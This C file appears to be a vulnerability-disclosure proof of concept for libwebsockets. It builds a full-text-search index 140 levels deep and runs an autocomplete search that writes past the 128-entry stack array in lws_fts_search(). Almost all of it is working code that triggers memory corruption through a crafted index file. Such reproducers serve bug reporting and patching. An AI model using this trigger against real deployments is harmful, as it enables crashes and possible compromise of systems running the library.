/*
 * PoC: FTS Search Stack Array OOB write
 *
 * Demonstrates that the traversal stack `struct wac s[128]` in
 * lws_fts_search() lacks a bounds check on `sp` before incrementing
 * at trie-fd.c:865. If the trie has depth >= 128 beyond the match
 * point, sp reaches 128 and memset(&s[128], ...) writes past the
 * array boundary on the stack.
 *
 *
 * Approach: Creates a valid FTS index with 140 words, each forcing a
 * new trie branching level. The word pattern "aaa...x" with increasing
 * prefix lengths creates a trie that branches at every character
 * position, producing depth > 128 for autocomplete traversal.
 *
 * Attack vector: Crafted FTS index file. An attacker who controls the
 * index file (e.g., via upload or man-in-the-middle) can construct
 * artificially deep trie paths to trigger the overflow.
 *
 * Version: 4.5.99-v4.5.0-455-gf5850ab19 (current main)
 */

#include <libwebsockets.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>

#define INDEX_FILE "/tmp/poc_fts_sp_oob.idx"
#define DEPTH 140

int main(void)
{
    struct lws_fts *t;
    struct lws_fts_file *jtf;
    struct lws_fts_result *result;
    struct lws_fts_search_params ftsp;
    int fd, i;

    printf("[*] FTS Search Stack OOB Write PoC\n");
    printf("[*] Reproducing trie-fd.c:865 — sp++ without bounds check\n\n");

    /*
     * Phase 1: Create words that force trie branching at each level.
     *
     * Words: "ax", "aax", "aaax", "aaaax", ..., "aaa...(140 a's)...x"
     *
     * This forces the trie to branch at each character position:
     * root → 'a' → 'a' → 'a' → ...
     *           ↘'x'  ↘'x'  ↘'x'
     *
     * Each 'a' node has 2 children ('a' and 'x'), creating depth = DEPTH.
     */
    printf("[*] Phase 1: Building content with %d branching words\n", DEPTH);

    char *content = malloc(DEPTH * (DEPTH + 4));
    if (!content) {
        perror("malloc");
        return 1;
    }
    content[0] = '\0';

    for (i = 1; i <= DEPTH; i++) {
        char word[256];
        memset(word, 'a', (size_t)i);
        word[i] = 'x';
        word[i + 1] = ' ';
        word[i + 2] = '\0';
        strcat(content, word);
    }

    size_t clen = strlen(content);
    if (clen > 0 && content[clen - 1] == ' ')
        content[clen - 1] = '\n';

    printf("    Created %d words: ax, aax, aaax, ..., a^%dx\n", DEPTH, DEPTH);
    printf("    Each level forces a trie branch (a→x and a→a)\n");
    printf("    Expected trie depth: ~%d (exceeds s[128] limit)\n\n", DEPTH);

    /*
     * Phase 2: Create FTS index
     */
    printf("[*] Phase 2: Creating FTS index file\n");
    fd = open(INDEX_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        perror("open for create");
        free(content);
        return 1;
    }

    t = lws_fts_create(fd);
    if (!t) {
        fprintf(stderr, "lws_fts_create failed\n");
        close(fd);
        free(content);
        return 1;
    }

    int fi = lws_fts_file_index(t, "deepfile.txt", 12, 0);
    lws_fts_fill(t, (uint32_t)fi, content, strlen(content));
    free(content);

    if (lws_fts_serialize(t)) {
        fprintf(stderr, "lws_fts_serialize failed\n");
        lws_fts_destroy(&t);
        close(fd);
        return 1;
    }
    lws_fts_destroy(&t);
    close(fd);
    printf("    Index created successfully\n\n");

    /*
     * Phase 3: Search with "a" to trigger deep autocomplete
     */
    printf("[*] Phase 3: Searching for 'a' to trigger autocomplete traversal\n");
    printf("    Autocomplete descends the full trie depth (%d levels)\n", DEPTH);
    printf("    sp increments at each level (line 865)\n");
    printf("    At sp=127: sp++ → sp=128 → memset(&s[128], ...) → OOB WRITE\n\n");

    jtf = lws_fts_open(INDEX_FILE);
    if (!jtf) {
        fprintf(stderr, "lws_fts_open failed\n");
        unlink(INDEX_FILE);
        return 1;
    }

    memset(&ftsp, 0, sizeof(ftsp));
    ftsp.needle = "a";
    ftsp.flags = LWSFTS_F_QUERY_AUTOCOMPLETE | LWSFTS_F_QUERY_FILES;
    ftsp.max_autocomplete = 200;
    ftsp.max_files = 200;
    ftsp.max_lines = 0;

    printf("[*] Calling lws_fts_search() — will trigger OOB if depth > 128\n");
    result = lws_fts_search(jtf, &ftsp);

    if (result) {
        printf("[*] Search completed\n");
        int ac_count = 0;
        struct lws_fts_result_autocomplete *ac = result->autocomplete_head;
        while (ac) {
            ac_count++;
            ac = ac->next;
        }
        printf("    Autocomplete results: %d\n", ac_count);
    } else {
        printf("[*] Search returned NULL\n");
    }

    if (ftsp.results_head)
        lwsac_free(&ftsp.results_head);
    lws_fts_close(jtf);
    unlink(INDEX_FILE);

    printf("\n[*] Analysis:\n");
    printf("    The s[128] stack array in lws_fts_search() has no bounds check\n");
    printf("    at line 865 before sp++. If trie depth exceeds 128, sp reaches\n");
    printf("    128 and memset(&s[128], ...) writes past the array boundary.\n");
    printf("    \n");
    printf("    An attacker who controls the FTS index file can construct\n");
    printf("    artificially deep trie paths to trigger this overflow.\n");

    return 0;
}
